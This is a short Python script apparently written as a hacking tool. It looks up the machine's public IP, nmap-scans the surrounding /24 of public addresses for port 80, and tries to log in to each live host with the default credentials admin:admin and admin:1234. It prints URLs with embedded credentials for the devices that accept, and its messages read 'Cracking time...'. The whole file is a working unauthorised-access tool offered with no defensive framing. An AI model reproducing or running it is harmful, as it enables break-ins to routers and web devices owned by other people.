import nmap
import requests
import urllib, json
from requests.auth import HTTPBasicAuth


def find_ip_range():
    print 'Finding IP...'
    data = json.loads(urllib.urlopen("https://api.ipify.org/?format=json").read())
    ip = str(data["ip"])
    return ip[:ip.rfind('.')]+'.*'

def scan_ip_range(ip_range):
    print 'Scanning IP range...' + ip_range
    nm = nmap.PortScanner()
    nm.scan(hosts= ip_range,ports='80',arguments='')
    return nm.all_hosts()


def login(live_ips):
    print "Cracking time..."
    openable_list = []
    for n in live_ips:
        n = 'http://' + n
        print 'IP: ' + str(n)
        try:
            if (requests.get(str(n), auth=HTTPBasicAuth('admin', 'admin'), timeout = 5)).status_code == 200:
                openable_list.append(str(n)[:7] + "admin:admin@" + str(n)[7:])
            elif (requests.get(str(n), auth=HTTPBasicAuth('admin', '1234'), timeout = 5)).status_code == 200:
                print '1234 baby'
                openable_list.append(str(n)[:7] + "admin:1234@" + str(n)[7:])
        except Exception:
            print 'timeout'
    return openable_list


print login(scan_ip_range(find_ip_range()))

